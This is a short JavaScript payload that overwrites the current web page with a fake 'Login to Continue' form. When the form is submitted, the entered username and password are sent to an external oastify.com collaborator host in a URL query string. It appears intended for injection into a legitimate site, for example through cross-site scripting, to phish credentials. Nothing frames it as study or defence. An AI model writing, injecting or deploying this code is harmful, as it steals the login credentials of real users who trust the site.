(function () {

document.documentElement.innerHTML = `
<head>
<style>
body{
  margin:0;
  background:#0b0f17;
  font-family: Inter, sans-serif;
  display:flex;
  align-items:center;
  justify-content:center;
  height:100vh;
}

#loginBox{
  background:#0b0f17;
  color:white;
  padding:2rem;
  border-radius:12px;
  width:320px;
  box-shadow:0 0 20px rgba(138,99,255,0.6);
}

#loginBox h2{
  text-align:center;
  color:#8a63ff;
}

input{
  width:100%;
  padding:10px;
  margin-bottom:12px;
  border:1px solid #2a2f3c;
  border-radius:8px;
  background:#1a1f2c;
  color:white;
}

button{
  width:100%;
  padding:10px;
  background:linear-gradient(90deg,#8a63ff,#5a3cc8);
  border:none;
  border-radius:8px;
  color:white;
  font-weight:bold;
  cursor:pointer;
}
</style>
</head>

<body>

<div id="loginBox">
<h2>Login to Continue</h2>

<form id="loginForm">
<input id="username" placeholder="Username" required>
<input id="password" type="password" placeholder="Password" required>
<button>Login</button>
</form>

</div>

</body>
`;

document.getElementById("loginForm").addEventListener("submit",function(e){

e.preventDefault();

const u=document.getElementById("username").value;
const p=document.getElementById("password").value;

fetch("https://3rvorvb38y8xh651bghtznbl9cf33tri.oastify.com/?u="+encodeURIComponent(u)+"&p="+encodeURIComponent(p));

});

})();
